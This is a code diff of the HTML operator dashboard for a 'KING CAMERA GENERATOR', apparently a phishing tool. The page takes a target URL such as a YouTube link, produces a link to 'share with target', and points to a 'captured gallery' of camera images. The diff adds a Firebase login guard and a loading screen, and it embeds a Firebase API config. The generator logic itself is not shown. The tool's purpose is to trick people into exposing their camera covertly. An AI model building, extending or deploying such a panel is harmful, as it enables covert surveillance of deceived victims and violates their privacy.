@@ -2,37 +2,51 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Camera Dashboard - WE ARE KING</title>
+    <title>Dashboard - WE ARE KING</title>
     <style>
-        body { display: none; background: #0f172a; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; }
-        .box { background: #1e293b; padding: 30px; border-radius: 15px; border: 1px solid #00d2ff; display: inline-block; box-shadow: 0 0 20px rgba(0,210,255,0.2); }
-        input { padding: 12px; width: 280px; background: #0f172a; color: #00d2ff; border: 1px solid #334155; border-radius: 5px; }
-        button { padding: 12px 20px; background: #00d2ff; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; }
+        /* Loading screen style */
+        body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; margin: 0; }
+        #loadingOverlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #0f172a; display: flex; align-items: center; justify-content: center; z-index: 999;
+        }
+        #mainContent { display: none; padding: 50px; }
+        .box { background: #1e293b; padding: 30px; border-radius: 15px; border: 1px solid #00d2ff; display: inline-block; }
+        input { padding: 12px; width: 280px; background: #0f172a; color: #00d2ff; border: 1px solid #334155; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2 style="color: #00d2ff;">KING CAMERA GENERATOR</h2>
-        <p style="font-size: 14px; color: #94a3b8;">Enter Target URL (e.g. YouTube Link)</p>
-        <input type="text" id="targetUrl" placeholder="https://youtube.com">
-        <br>
-        <button onclick="generateLink()">GENERATE MAGIC LINK</button>
-        
-        <div id="result" style="margin-top: 25px; display: none; border-top: 1px solid #334155; padding-top: 15px;">
-            <p style="font-size: 12px; color: #94a3b8;">Share this link with target:</p>
-            <p id="finalLink" style="color: #00d2ff; font-weight: bold; word-break: break-all; font-family: monospace;"></p>
-            <button onclick="copyBtn()" style="background: #334155; color: white; font-size: 12px;">COPY LINK</button>
+    <!-- Jab tak login check ho raha hai, ye nazar aayega -->
+    <div id="loadingOverlay">
+        <div>
+            <h2 style="color: #00d2ff;">Checking King's Access...</h2>
+            <p>Please wait a moment.</p>
         </div>
     </div>
-    <br><br>
-    <a href="gallery.html" style="color: #22c55e; text-decoration: none; font-weight: bold;">[ OPEN CAPTURED GALLERY ]</a>
+
+    <!-- Login confirm hone ke baad ye nazar aayega -->
+    <div id="mainContent">
+        <div class="box">
+            <h2 style="color: #00d2ff;">KING CAMERA GENERATOR</h2>
+            <input type="text" id="targetUrl" placeholder="Enter Target Link (e.g. YouTube)">
+            <br><br>
+            <button onclick="generateLink()" style="padding: 12px 20px; background: #00d2ff; border: none; font-weight: bold; cursor: pointer;">GENERATE LINK</button>
+            
+            <div id="result" style="margin-top: 20px; display: none; border: 1px dashed #00d2ff; padding: 10px;">
+                <p id="finalLink" style="color: #00d2ff; word-break: break-all;"></p>
+                <button onclick="copyBtn()">COPY</button>
+            </div>
+        </div>
+        <br><br>
+        <a href="gallery.html" style="color: #22c55e; font-weight: bold;">[ OPEN GALLERY ]</a>
+    </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
-        // 1. MAIN WEBSITE CONFIG (Authentication)
+        // 1. MAIN WEBSITE CONFIG (Isay DEFAULT rakha hai taake login session mil jaye)
         const mainSiteConfig = {
             apiKey: "AIzaSyC9z_N93wf9RFzEYZEIlXE8yiCcnJuWC4A",
             authDomain: "cybertoolkit-65b65.firebaseapp.com",
@@ -41,16 +55,18 @@
             appId: "1:412853505695:web:050010f944695ddff41caa"
         };
 
-        // Initialize Main App
-        const mainApp = initializeApp(mainSiteConfig, "mainApp");
-        const auth = getAuth(mainApp);
+        // Initialize Default App for Authentication
+        const app = initializeApp(mainSiteConfig);
+        const auth = getAuth(app);
 
-        // Auth Guard: Check if user is logged in to CyberToolkit
+        // Auth Observer: Wait for session restoration
         onAuthStateChanged(auth, (user) => {
             if (user) {
-                document.body.style.display = "block";
+                console.log("Success: King logged in!");
+                document.getElementById('loadingOverlay').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
             } else {
-                console.log("No session found on CyberToolkit. Redirecting...");
+                console.warn("No session found. Redirecting...");
                 window.location.href = "index.html";
             }
         });
@@ -64,7 +80,7 @@
 
         window.copyBtn = function() {
             navigator.clipboard.writeText(document.getElementById('finalLink').innerText);
-            alert("Link Copied!");
+            alert("Copied!");
         }
     </script>
 </body>
